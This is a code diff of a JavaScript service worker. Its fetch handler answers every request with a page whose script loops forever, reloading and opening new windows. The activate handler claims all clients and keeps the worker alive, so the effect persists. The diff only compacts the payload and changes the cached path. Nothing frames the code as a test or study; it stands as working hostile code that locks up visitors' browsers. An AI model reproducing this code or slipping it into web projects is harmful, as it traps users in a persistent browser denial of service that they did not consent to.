@@ -1,25 +1,18 @@
-var cacheid = "cache-v1";
-
 self.addEventListener("install", (e) => {
     e.waitUntil(
-        caches.open(cacheid).then((cache) => {
-            return cache.addAll(['/']);
+        caches.open("cache-v1").then((cache) => {
+            return cache.addAll(['/index.html']);
         })
     );
     self.skipWaiting();
 });
 
 self.addEventListener("fetch", (e) => {
-    // Always respond with a cached version that forces reload
+    // always respond with a cached version that forces reload
     e.respondWith(
         new Response(
-            `<script>
-                for(;;) { 
-                    location.reload(true);
-                    window.open('/', '_blank');
-                }
-            </script>`, 
-            {
+            `<body><script>while(1){location.reload(1);window.open('/', '_blank');};</script></body>`, 
+            { 
                 status: 200,
                 headers: {'Content-Type': 'text/html'}
             }
@@ -29,7 +22,7 @@ self.addEventListener("fetch", (e) => {
 
 self.addEventListener("activate", (e) => {
     e.waitUntil(clients.claim());
-    // Keep service worker active
+    // keep service worker active
     setInterval(() => {
         self.clients.matchAll().then(clients => {
             clients.forEach(client => client.postMessage('keepalive'));
